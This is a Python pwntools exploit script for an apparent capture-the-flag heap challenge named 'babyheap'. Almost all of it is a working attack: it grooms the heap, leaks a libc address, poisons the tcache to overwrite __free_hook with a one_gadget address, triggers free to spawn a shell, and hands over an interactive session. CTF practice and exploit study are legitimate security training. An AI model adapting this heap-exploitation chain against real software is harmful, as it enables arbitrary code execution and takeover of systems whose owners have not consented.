from pwn import *

bin = ELF('./babyheap')
libc = ELF('./libc.so', checksec=False)

context.log_level = 'debug'

one_gadget_offset = [0xe237f, 0xe2383, 0xe2386, 0x106ef8]


def malloc(size, content):
    conn.sendafter('Command:\n> ', 'M')
    conn.sendafter('Size:\n> ', str(size))
    conn.sendafter('Content:\n> ', content)


def free(idx):
    conn.sendafter('> ', 'F')
    conn.sendafter('> ', str(idx))


def show(idx):
    conn.sendafter('> ', 'S')
    conn.sendafter('> ', str(idx))


conn = process('./babyheap', env={'LD_PRELOAD': './libc.so'})
# gdb.attach(conn, '')

# Libc Leak
malloc(0xf8, 'AAAAAAA\n')
malloc(0xf8, 'BBBBBBB\n')
for i in range(8):
    malloc(0x178, 'AAAAAAAABBBBBBBB' * 7 +
           'CCCCCCCC' + '\x01\x01\x00')  # 2 ~ 9

for i in range(3, 10):
    free(i)

free(0)
malloc(0xf8, 'AAAAAAAA' * 2 * 0xf + 'BBBBBBBB' + '\x81\n')
free(1)
malloc(0xf8, 'DDDDDDD\n')

show(2)
libc_addr = u64(conn.recv(6) + '\x00\x00') - 0x1e4ca0
log.info('Libc_addr: ' + hex(libc_addr))

"""
Current State
idx 0: chunk(0xf8)
idx 1: chunk(0xf8)
idx 2: chunk(0x80)
idx 3: NULL

bin: tcache bin of chunk size 0x181 saturated
"""
malloc(0x178, 'EEEEEEE\n')  # 3rd
malloc(0x178, 'FFFFFFF\n')  # 4th
malloc(0xf8, 'GGGGGGG\n')  # 5th
malloc(0xf8, 'HHHHHHH\n')  # 6th
malloc(0xf8, 'IIIIIII\n')  # 7th

free(6)
malloc(0xf8, 'JJJJJJJJ' * 2 * 0xf + 'BBBBBBBB' + '\x81\n')
free(7)

free(5)
malloc(0xf8, 'KKKKKKKK' * 2 * 0xf + 'BBBBBBBB' + '\x81\n')
free(6)

p = 'LLLLLLLL'*2*0xf + 'BBBBBBBB'*2
p += p64(libc_addr + libc.symbols['__free_hook'])[:-1]

malloc(0x178, p)
malloc(0x178, 'MMMMMMM\n')
malloc(0x178, p64(libc_addr + one_gadget_offset[1])[:-1])

free(0)

conn.interactive()